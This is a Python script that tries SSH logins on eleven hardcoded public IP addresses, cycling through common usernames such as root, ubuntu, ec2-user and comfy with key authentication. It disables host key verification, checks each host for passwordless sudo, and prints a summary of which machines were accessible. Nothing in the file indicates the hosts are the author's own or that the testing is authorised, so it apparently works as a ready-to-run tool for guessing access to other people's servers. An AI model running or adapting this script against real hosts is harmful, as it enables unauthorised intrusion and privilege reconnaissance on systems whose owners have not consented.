"""Probe SSH access on target machines — try common usernames with key auth."""
import subprocess, sys, threading, io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)
_lock = threading.Lock()

TARGETS = [
    "91.98.233.192",
    "49.233.213.26",
    "140.119.110.214",
    "213.199.63.51",
    "222.141.236.16",
    "95.169.202.102",
    "43.134.28.233",
    "123.233.116.37",
    "159.255.232.245",
    "220.76.87.112",
    "69.10.44.150",
]

USERNAMES = ["root", "ubuntu", "ec2-user", "admin", "comfy", "user"]

results = {}


def log(msg):
    with _lock:
        print(msg, flush=True)


def probe_one(ip):
    for user in USERNAMES:
        try:
            r = subprocess.run(
                [
                    "ssh",
                    "-o", "BatchMode=yes",
                    "-o", "ConnectTimeout=8",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=NUL",
                    "-p", "22",
                    f"{user}@{ip}",
                    "echo SSH_OK && whoami && id && sudo -n echo SUDO_OK 2>/dev/null || echo SUDO_NO",
                ],
                capture_output=True, text=True, timeout=20,
            )
            output = (r.stdout + r.stderr).strip()
            if "SSH_OK" in r.stdout:
                has_sudo = "SUDO_OK" in r.stdout
                log(f"[{ip}] SSH OK as {user} | sudo={'YES' if has_sudo else 'NO'}")
                log(f"  output: {r.stdout.strip()[:200]}")
                results[ip] = {"user": user, "sudo": has_sudo, "status": "OK"}
                return
        except subprocess.TimeoutExpired:
            continue
        except Exception as e:
            continue

    log(f"[{ip}] SSH FAILED (all usernames rejected)")
    results[ip] = {"status": "FAILED"}


targets = sys.argv[1:] if len(sys.argv) > 1 else TARGETS

threads = []
for ip in targets:
    t = threading.Thread(target=probe_one, args=(ip,))
    t.start()
    threads.append(t)
for t in threads:
    t.join(timeout=60)

print("\n" + "="*60)
print("  SSH ACCESS SUMMARY")
print("="*60)
for ip in targets:
    r = results.get(ip, {"status": "UNKNOWN"})
    if r["status"] == "OK":
        print(f"  {ip:>20s}  ->  SSH as {r['user']} | sudo={'YES' if r['sudo'] else 'NO'}")
    else:
        print(f"  {ip:>20s}  ->  {r['status']}")

ok = sum(1 for r in results.values() if r["status"] == "OK")
print(f"\n  {ok} accessible | {len(targets) - ok} failed | {len(targets)} total")
print("="*60)
